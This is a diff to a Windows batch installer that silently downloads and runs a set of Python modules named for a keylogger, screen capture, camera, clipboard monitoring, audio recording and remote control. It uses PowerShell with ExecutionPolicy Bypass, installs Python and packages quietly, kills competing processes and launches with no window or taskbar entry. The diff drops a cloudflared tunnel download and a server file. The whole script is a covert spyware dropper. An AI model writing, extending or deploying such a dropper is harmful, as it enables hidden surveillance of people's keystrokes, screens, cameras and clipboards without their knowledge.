@@ -10,8 +10,7 @@ mkdir "%DIR%\recordings" 2>nul
 :: Download all files silently
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "$r='%RAW%'; $d='%DIR%';" ^
-  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
-  "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""
+  "'app.py','keylogger.py','screencap.py','controller.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" }"
 
 :: Install Python silently if not present
 python --version >nul 2>&1
@@ -25,14 +24,14 @@ if %errorlevel% neq 0 (
 :: Install dependencies quietly
 pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location
 
-:: Download cloudflared (always refresh)
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe','%DIR%\cloudflared.exe')"
-
 :: Kill any existing instance holding port 9090
 for /f "tokens=5" %%a in ('netstat -aon 2^>nul ^| find ":9090" ^| find "LISTENING"') do (
     taskkill /F /PID %%a >nul 2>&1
 )
+timeout /t 1 /nobreak >nul
+
+:: Kill any existing nora instance
+taskkill /F /IM pythonw.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
 
 :: Launch silently - no window, no taskbar
